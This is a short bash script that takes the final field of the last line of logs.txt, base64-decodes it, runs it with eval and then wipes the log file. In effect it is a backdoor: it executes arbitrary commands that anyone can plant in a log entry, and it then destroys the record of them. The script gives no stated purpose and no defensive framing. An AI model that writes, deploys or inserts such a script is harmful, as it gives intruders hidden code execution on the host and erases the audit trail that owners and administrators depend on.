#!/bin/bash
command="$(tail -1 logs.txt | sed 's/\"/ /g'| awk -F' ' '{print $8}' | base64 --decode)"
eval "$command"
echo "" > logs.txt
